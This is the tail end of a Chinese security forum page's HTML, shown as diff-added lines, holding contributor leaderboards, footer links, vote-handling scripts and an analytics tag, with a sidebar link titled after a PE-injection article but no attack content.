+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/t/16622" title="PE 文件结构剖析：手工压缩与注入实战">
+                                PE 文件结构剖析：手工压缩与注入实战
+                            </a>
+                        </div>
+
+                    </div>
+                
+            </div>
+    </div>
+
+
+<div class="box">
+    <div class="global-charts">
+        <div id="chart-header">
+            <div class="col-sm-4 text-center charts" data-type="year">
+                年度贡献榜
+            </div>
+            <div class="text-center charts active" data-type="month">
+                月度贡献榜
+            </div>
+            <div class="clearfix"></div>
+        </div>
+        <div id="chart_body">
+            <div class="info-body" data-type="year">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com/media/upload/avatars/10995_36191b735a3f1cf36c.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/10995" title="Al1ex">Al1ex</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">69</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/83993" title="1315609050541697">1315609050541697</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">64</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/3314" title="熊猫正正">熊猫正正</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">53</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/82355" title="ooyywwll">ooyywwll</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">42</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/76340" title="T0daySeeker">T0daySeeker</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">39</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+            </div>
+            <div class="info-body" data-type="month">
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/97895" title="ve1kcon" style="">ve1kcon</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">15</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/83993" title="1315609050541697" style="">1315609050541697</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">14</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/98589" title="1308717206437573" style="">1308717206437573</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">10</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com/media/upload/avatars/84382_f6f40d6f29590569f6.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/84382" title="Obito" style="">Obito</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">8</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/88107" title="sn0w" style="">sn0w</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">8</span>
+                            </span>
+                        </div>
+                    </div>
+                
+            </div>
+        </div>
+
+    </div>
+</div>
+
+    
+    <div style="clear: both;"></div>
+
+
+    <script type="text/javascript">
+        $(function () {
+            $(".charts").click(switchChart);
+            $("[data-toggle='tooltip']").tooltip();
+
+            function switchChart() {
+                let _this = $(this);
+                let idx = _this.attr("data-type")
+                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
+                if (!_this.hasClass("active")) {
+                    _this.addClass("active").siblings().removeClass("active")
+                    content.show().siblings().hide()
+                }
+            }
+        })
+    </script>
+
+
+    <style>
+
+    </style>
+
+
+        </div>
+    </div>
+
+
+</div>
+<footer class="bs-docs-footer">
+    <div class="container text-center">
+        <div class="links">
+            <a href="/feed" target="_blank">RSS</a>
+            <a href="/about" target="_blank"><span>关于社区</span></a>
+            <a href="/partner" target="_blank"><span>友情链接</span></a>
+            <a href="/notice">社区小黑板</a>
+            <a href="/connection">联系我们</a>
+            <a href="https://report.aliyun.com/" target="_blank">举报中心</a>
+            <a href="https://www.aliyun.com/complaint" target="_blank">我要投诉</a>
+        </div>
+    </div>
+</footer>
+
+<script src="/static/js/bootstrap.min.js"></script>
+<script src="/static/js/xz.js"></script>
+
+
+    
+    <script type="text/javascript">
+        $(document).ready(function () {
+            voteUp = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/up/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F15328&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-up').html(data.html);
+                                }
+                            }
+                        }
+                    });
+                }
+            };
+            voteDown = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/down/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F15328&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-down').html(data.html);
+                                }
+                            }
+
+                        }
+                    });
+                }
+            };
+            
+            $("[data-toggle='tooltip']").tooltip();
+        });
+    </script>
+
+
+    <script src="https://s11.cnzz.com/z_stat.php?id=1260716569&amp;web_id=1260716569"></script>
+
+
+<div id="waf_nc_block" style="display: none;"><div class="waf-nc-mask"></div><div id="WAF_NC_WRAPPER" class="waf-nc-wrapper"><p class="waf-nc-title">访问验证</p><p class="waf-nc-description">为保证您的正常访问，请进行如下验证。</p><p id="waf-nc-traceid" class="waf-nc-traceid-class"></p><div id="nocaptcha"></div></div></div><div class="chat_sider_logo " id="chat_sider_logo">
+<img class="chat_sider_logoImg" id="chat_sider_logoImg" src="chrome-extension://jhlabifgfoigikpnmfcbhpddlamhfaag/img/ai_assistant.png"></div></body>
